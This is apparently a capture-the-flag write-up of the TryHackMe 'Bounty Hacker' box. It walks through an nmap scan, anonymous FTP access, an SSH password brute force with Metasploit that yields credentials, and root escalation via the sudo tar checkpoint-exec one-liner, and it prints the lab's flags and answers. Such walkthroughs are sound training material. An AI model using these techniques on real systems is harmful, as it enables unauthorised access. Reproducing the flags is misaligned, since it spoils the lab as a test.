---
title: "THM Bounty Hacker"
date: 2020-11-03 13:10:00 -0700
categories: [THM, writeup]
tags: [writeup]
toc: true
---

> You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

## Introduction

TryHackMe's Bounty Hacker is a Cowboy Bebop themed easy box made for beginners. 

In this box, you uses anonymous FTP login to retrieve a wordlist and username which can be used to bruteforce ssh login. Once I brute-forced credentials with the help of a metasploit module, I logged in through SSH and got the user flag. I then abused the abilty of the account I was logged into to run ``/bin/tar`` as root to escalate privs and get a shell as root.

It took me around twenty minutes to get from deployment to root. 

## NMap

The IP address of my instance of the box is ``10.10.170.118``. 

Let's start a normal nmap scan..

```
nmap -sC -sV -o nmap.nmap 10.10.170.118
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-03 14:47 EST                                                                                                                                          
Nmap scan report for 10.10.170.118                                                                                                                                                                       
Host is up (0.15s latency).                                                                                                                                                                              
Not shown: 967 filtered ports, 30 closed ports                                                                                                                                                           
PORT   STATE SERVICE VERSION                                                                                                                                                                             
21/tcp open  ftp     vsftpd 3.0.3                                                                                                                                                                        
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                                                                   
|_Can't get directory listing: TIMEOUT                                                                                                                                                                   
| ftp-syst:                                                                                                                                                                                              
|   STAT:                                                                                                                                                                                                
| FTP server status:                                                                                                                                                                                     
|      Connected to ::ffff:10.2.19.105                                                                                                                                                                   
|      Logged in as ftp                                                                                                                                                                                  
|      TYPE: ASCII                                                                                                                                                                                       
|      No session bandwidth limit                                                                                                                                                                        
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.97 seconds
```

FTP with Anonymous login, a web server, and ssh. First thing, let's check out if there are any files on the FTP server.


## Anonymous FTP Login

I will use the FTP Client FileZilla to login. 

![FTPFiles](https://i.imgur.com/BxXcP87.png)

Two files, ``locks.txt`` and ``task.txt``. I'll copy them over to my local machine and check them out.

```
kali@kali:~/Desktop/thm/bountyhacker$ cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

```
kali@kali:~/Desktop/thm/bountyhacker$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

It looks like we have a wordlist along with a username (lin) to go along with it. We can now answer the first question TryHackMe has for this box:

```
Who wrote the task list? 
> lin
```

## Bruteforcing SSH

In my experience, bruteforcing SSH has almost never been the answer, although the question asked by TryHackMe heavily imples it. We have a wordlist and a username, so I will use a metasploit module with the information I have.

There is a metapsploit module named ``auxiliary/scanner/ssh/ssh_login`` which we can configure to use our wordlist and the username ``lin``.

I'll fire up metasploit with ``msfconsole`` and use the module by typing ``use auxiliary/scanner/ssh/ssh_login``. 

Now let's see what we need to configure:

```
msf5 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts
```

Ok, we will configure the username to ``lin``, the pass_file to ``locks.txt``, and the RHOSTS variable to the IP of the box, which in my case is ``10.10.170.118``. 

```
msf5 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 10.10.170.118
RHOSTS => 10.10.170.118
msf5 auxiliary(scanner/ssh/ssh_login) > set USERNAME lin
USERNAME => lin
msf5 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE locks.txt
PASS_FILE => locks.txt
```

Now we'll run the module to begin bruteforcing...

```
msf5 auxiliary(scanner/ssh/ssh_login) > run

[+] 10.10.170.118:22 - Success: 'lin:RedDr4gonSynd1cat3' 'uid=1001(lin) gid=1001(lin) groups=1001(lin) Linux bountyhacker 4.15.0-101-generic #102~16.04.1-Ubuntu SMP Mon May 11 11:38:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (10.2.19.105:35275 -> 10.10.170.118:22) at 2020-11-03 15:13:46 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

And we got credentials! 

``lin:RedDr4gonSynd1cat3``

With this, we can answer TryHackMe's next questions:

```
What service can you bruteforce with the text file found?
> ssh

What is the users password? 
> RedDr4gonSynd1cat3
```

Now let's login with ssh.


```
kali@kali:~/Desktop/thm/bountyhacker$ ssh lin@10.10.170.118
The authenticity of host '10.10.170.118 (10.10.170.118)' can't be established.
ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.170.118' (ECDSA) to the list of known hosts.
lin@10.10.170.118's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ 
```

We're in!

We can now grab the first flag on the machine:

```
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}
lin@bountyhacker:~/Desktop$ 
```

## Priv Esc

Now that have a normal user account, let's try to escalate our privs and get root. Let's see what commands we can run as root:

```
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Looks like we can run ``/bin/tar`` as root. 

A quick google search yeilds this link: https://gtfobins.github.io/gtfobins/tar/

Let's run the first command from the site: ``tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`` with sudo.

```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# 
```

We have root! We can now get the second flag and finish the box.

```
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
# 
```

## Conclusion

Tools Used: ``nmap``, ``filezilla``,  ``metasploit``, 

Overall, this box is beginner-friendly and I would suggest it for someone who is just getting into these kinds of labs. There are well-defined goals that make use of common technologies and tools, thus figuring out what to do isn't difficult at all. 
